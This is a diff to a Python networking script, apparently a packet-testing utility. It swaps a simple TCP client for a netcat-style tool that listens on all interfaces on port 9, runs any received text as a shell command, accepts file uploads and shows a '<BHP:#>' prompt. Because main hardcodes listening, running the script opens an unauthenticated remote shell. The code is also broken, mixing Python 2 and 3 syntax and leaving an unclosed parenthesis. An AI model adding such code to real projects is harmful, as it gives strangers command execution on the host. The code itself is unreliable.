@@ -163,26 +163,123 @@ def recv(port=9, addr="192.168.9.246", buf_size=1024):
     s.close()
     return data
 
+
+
+import sys
 import socket
-import time
-import multiprocessing
-def worker(udp_ip, udp_port, response_buffer_size):
-    MESSAGE = b"Bazinga!"
+import getopt
+import threading
+import subprocess
+listen = command = upload = False
+execute = target = upload_destination = ''
+port = 0
+def client_sender(buffer):
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((udp_ip, udp_port))
-    s.send(MESSAGE.encode())
-    print("Message sent.")
+    try:
+        client.connect((target, port))
 
-    response_count = 1
+        if len(buffer):
+            client.send(buffer)
+
+        while True:
+            recv_len = 1
+            response = ''
+
+            while recv_len:
+                data = client.recv(4096)
+                recv_len = len(data)
+                response += data
+
+                if recv_len < 4096:
+                    break
+
+            print response
+
+            buffer = raw_input('')
+            buffer += '\n'
+
+            client.send(buffer)
+    except:
+        print 'Exception. Exiting'
+        client.close()
+
+
+def server_loop():
+    global target
+
+    if not len(target):
+        target = '0.0.0.0'
+
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((target, port))
+    server.listen(5)
+
     while True:
-        response = s.recv(response_buffer_size).decode()
-        if len(response) == 0: break
-        print("[response]", response_count, ":", response)
-        response_count += 1
-    # If we got here, the connection was closed
-    s.close()
-    print("Socket closed.")
+        client_socket, address = server.accept()
+        client_thread = threading.Thread(
+            target=client_handler,
+            args=(client_socket,)
+        )
+        client_thread.start()
+
+
+def run_command(cmd):
+    command = cmd.rstrip()
+
+    try:
+        output = subprocess.check_output(
+            command,
+            stderr=subprocess.STDOUT,
+            shell=True
+        )
+    except:
+        output = 'Failed to execute command\r\n'
+
+    return output
+
+
+def client_handler(client_socket):
+    global upload, execute, command
+
+    if len(upload_destination):
+        file_buffer = ''
+
+        while True:
+            data = client_socket.recv(1024)
+
+            if not data:
+                break
+            else:
+                file_buffer += data
+
+        try:
+            file_descriptor = open(upload_destination, 'wb')
+            file_descriptor.write(file_buffer)
+            file_descriptor.close()
+
+            client_socket.send('Successfully saved file to {}\r\n'.format(upload_destination))
+        except:
+            client_socket.send('Failed to save file to {}\r\n'.format(upload_destination))
+
+    if len(execute):
+        output = run_command(execute)
+        client_socket.send(output)
+
+    if command:
+        while True:
+            client_socket.send('<BHP:#> ')
+            cmd_buffer = ''
+
+            while '\n' not in cmd_buffer:
+                cmd_buffer += client_socket.recv(1024)
+
+            response = run_command(cmd_buffer)
+            client_socket.send(response)
+
+
+
+
 
 if __name__ == '__main__':
     from lvwolutils import Utils
@@ -218,13 +315,13 @@ if __name__ == '__main__':
     #print("received[buf]: " + data)
     #pdata = pktlen, data, timestamp
 
-    UDP_IP = '192.168.9.246'
-    UDP_PORT = 9
-    BUFFER_SIZE = 1024
+    #UDP_IP = '192.168.9.246'
+    #UDP_PORT = 9
+    #BUFFER_SIZE = 1024
 
-    p = multiprocessing.Process(target=worker, args=(UDP_IP, UDP_PORT, BUFFER_SIZE))
-    p.start()
-    p.join(3)
+    #p = multiprocessing.Process(target=worker, args=(UDP_IP, UDP_PORT, BUFFER_SIZE))
+    #p.start()
+    #p.join(3)
 
     #if p.is_alive():
         #print("Killing thread ...")
@@ -234,6 +331,37 @@ if __name__ == '__main__':
 
     #print("Goodbye.")
 
+
+    #global listen, port, execute, command, upload_destination, target
+
+
+    #for o, a in opts:
+    #    if o in ('-h', '--help'):
+    #        usage()
+    #    elif o in ('-l', '--listen'):
+    #        listen = True
+    #    elif o in ('-e', '--execute'):
+    #        execute = a
+    #    elif o in ('-c', '--command'):
+    #        command = True
+    #    elif o in ('-u', '--upload'):
+    #        upload_destination = a
+    #    elif o in ('-t', '--target'):
+    #        target = a
+    #    elif o in ('-p', '--port'):
+    #        port = int(a)
+    #    else:
+    #        assert False, 'Unhandled Option'
+
+    listen = True
+    port = int(9)
+
+    if not listen and len(target) and port > 0:
+        buffer = sys.stdin.read(
+        client_sender(buffer)
+
+    if listen:
+        server_loop()
 
     #pack = recv
     #pack()
